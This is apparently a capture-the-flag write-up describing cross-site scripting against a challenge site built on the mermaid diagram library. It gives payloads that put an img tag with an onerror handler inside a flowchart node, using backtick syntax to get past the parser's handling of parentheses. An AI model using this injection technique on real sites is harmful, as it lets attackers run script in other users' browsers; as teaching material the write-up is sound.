<p><strong>Problem description</strong>: Fine, I'll use a damn lib. Let's see if it's any better. </p>

<hr />

<p>We quickly note that the challenge is written using the mermaid library. Similar to how we did the first challenge, we looked for a way to embed an image into a mermaid flowchart, and found this link: https://github.com/knsv/mermaid/issues/548</p>

<p><code>
graph LR; D--&gt;X((&lt;img src='/address/to/image.png' width=5&gt;))
</code></p>

<p>Was a valid graph that we used. Next, we did injection:</p>

<p><code>
graph LR; D--&gt;X((&lt;img src='/address/to/image.png' width=5 onerror='javascript:alert(1)' &gt;))
</code></p>

<p>Unfortunately, this no worko because it sees the <code>(</code> and <code>)</code> in the onerror, tries to parse them, and breaks. Thankfully my teammate told me that I can use ` instead of parentheses in javascript, so this worked:</p>

<p><code>
graph LR; D--&gt;X((&lt;img src='/address/to/image.png' width=5 onerror='javascript:alert`1`' &gt;))
</code></p>

<p>We submit this in the URL for the flag.</p>
